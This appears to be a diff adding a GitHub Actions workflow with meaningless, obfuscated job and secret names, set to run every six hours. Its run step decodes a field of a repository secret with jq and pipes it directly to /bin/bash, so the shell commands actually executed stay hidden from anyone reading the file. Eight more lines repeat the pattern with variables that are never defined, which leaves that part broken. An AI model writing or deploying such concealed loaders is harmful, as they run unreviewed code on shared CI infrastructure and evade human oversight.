@@ -1,0 +1,27 @@
+name: lulizhen1986
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '39 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: lulizhen1986
+        env:
+          dq666: ${{ secrets.dq666 }}
+        run: |
+          echo $dq666 | jq -r .lrd0230 | /bin/bash
+          echo $wvlf15937 | jq -r .fst683 | /bin/bash
+          echo $bu0 | jq -r .mke6 | /bin/bash
+          echo $zkol11 | jq -r .owe39 | /bin/bash
+          echo $lb024 | jq -r .oq97 | /bin/bash
+          echo $kvd8 | jq -r .ugyks39 | /bin/bash
+          echo $bot195 | jq -r .rweqp5 | /bin/bash
+          echo $mlek34308 | jq -r .z3629 | /bin/bash
+          echo $kbuz20 | jq -r .gotkr64424 | /bin/bash
+
